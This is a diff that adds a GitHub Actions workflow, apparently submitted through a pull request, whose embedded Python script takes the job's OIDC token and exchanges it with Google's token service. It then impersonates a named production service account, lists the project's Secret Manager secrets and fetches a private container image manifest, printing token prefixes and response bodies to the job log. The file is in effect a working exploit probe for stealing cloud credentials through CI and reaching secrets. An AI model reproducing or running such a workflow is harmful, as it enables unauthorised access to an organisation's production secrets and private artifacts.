@@ -1,0 +1,75 @@
+name: wif-pr-probe
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: probe
+        env:
+          AUD: //iam.googleapis.com/projects/1025538909507/locations/global/workloadIdentityPools/github/providers/github-actions
+          SA: pipelines-runtime-builder@replicate-production.iam.gserviceaccount.com
+        run: |
+          echo "ENV event=$GITHUB_EVENT_NAME repo=$GITHUB_REPOSITORY ref=$GITHUB_REF sha=$GITHUB_SHA actor=$GITHUB_ACTOR"
+          python3 - <<'PY'
+          import json, os, base64, urllib.request, urllib.parse, urllib.error
+          def call(method, url, body=None, token=None, extra=None):
+              data = json.dumps(body).encode() if body is not None else None
+              h = {'Content-Type': 'application/json'}
+              if token: h['Authorization'] = 'Bearer ' + token
+              if extra: h.update(extra)
+              req = urllib.request.Request(url, data=data, headers=h, method=method)
+              try:
+                  r = urllib.request.urlopen(req, timeout=30)
+                  return r.status, r.read().decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode('utf-8', 'replace')[:1500]
+              except Exception as e:
+                  return -1, repr(e)[:400]
+          aud = os.environ['AUD']; sa = os.environ['SA']
+          rurl = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
+          rtok = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
+          print('RESULT oidc_url_present=%s oidc_token_present=%s' % (bool(rurl), bool(rtok)))
+          if not rurl:
+              print('RESULT no_oidc_url_stop')
+              raise SystemExit(0)
+          st, body = call('GET', rurl + '&audience=' + urllib.parse.quote(aud, safe=''), token=rtok)
+          print('RESULT oidc_status=%s body_len=%s' % (st, len(body)))
+          if st != 200:
+              print('RESULT oidc_body=' + body[:400]); raise SystemExit(0)
+          jwt = json.loads(body)['value']
+          try:
+              p = jwt.split('.')[1]; p += '=' * (-len(p) % 4)
+              cl = json.loads(base64.urlsafe_b64decode(p))
+              keys = ['iss','sub','aud','repository','repository_owner','repository_visibility','ref','event_name','workflow_ref','job_workflow_ref','actor','environment']
+              print('RESULT claims=' + json.dumps({k: cl.get(k) for k in keys if k in cl}, sort_keys=True))
+          except Exception as e:
+              print('RESULT claims_decode_error=' + repr(e)[:200])
+          st, body = call('POST', 'https://sts.googleapis.com/v1/token', {
+              'audience': aud,
+              'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
+              'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
+              'scope': 'https://www.googleapis.com/auth/cloud-platform',
+              'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt',
+              'subjectToken': jwt})
+          print('RESULT sts_status=%s' % st)
+          if st != 200:
+              print('RESULT sts_body=' + body[:600]); raise SystemExit(0)
+          fed = json.loads(body)['access_token']
+          print('RESULT sts_token_prefix=%s len=%s' % (fed[:6], len(fed)))
+          st, body = call('POST', 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % urllib.parse.quote(sa, safe=''), {'scope': ['https://www.googleapis.com/auth/cloud-platform'], 'lifetime': '300s'}, token=fed)
+          print('RESULT impersonate_status=%s' % st)
+          if st != 200:
+              print('RESULT impersonate_body=' + body[:800]); raise SystemExit(0)
+          at = json.loads(body)['accessToken']
+          print('RESULT impersonate_token_prefix=%s len=%s' % (at[:6], len(at)))
+          st, body = call('GET', 'https://secretmanager.googleapis.com/v1/projects/replicate-production/secrets', token=at)
+          print('RESULT secrets_list_status=%s body_head=%s' % (st, body[:800]))
+          st, body = call('GET', 'https://us-docker.pkg.dev/v2/replicate-production/replicate-us/replicate/openai-gpt-5-internal/manifests/latest', token=at, extra={'Accept': 'application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json'})
+          print('RESULT gar_manifest_status=%s body_head=%s' % (st, body[:800]))
+          PY
